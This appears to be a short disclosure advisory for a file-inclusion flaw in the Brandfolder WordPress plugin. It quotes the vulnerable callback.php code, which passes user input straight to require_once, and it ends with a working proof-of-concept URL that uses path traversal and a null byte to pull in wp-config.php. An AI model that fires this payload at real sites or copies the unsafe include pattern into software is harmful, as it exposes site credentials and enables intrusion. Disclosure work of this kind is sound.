I-Details
The vulnerability occurs at the first lines of the file callback.php:

<?php
  ini_set('display_errors',1);
  ini_set('display_startup_errors',1);
  error_reporting(-1);

  require_once($_REQUEST['wp_abspath']  . 'wp-load.php');
  require_once($_REQUEST['wp_abspath']  . 'wp-admin/includes/media.php');
  require_once($_REQUEST['wp_abspath']  . 'wp-admin/includes/file.php');
  require_once($_REQUEST['wp_abspath']  . 'wp-admin/includes/image.php');
  require_once($_REQUEST['wp_abspath']  . 'wp-admin/includes/post.php');

$_REQUEST is based on the user input, so as you can guess,
an attacker can depending on the context, host on a malicious server
a file called wp-load.php, and disable its execution using an htaccess, or
abuse the null byte character ( %00, %2500 url-encoded)

II-Proof of concept

http://localhost/wp/wp-content/plugins/brandfolder/callback.php?wp_abspath=../../../wp-config.php%00
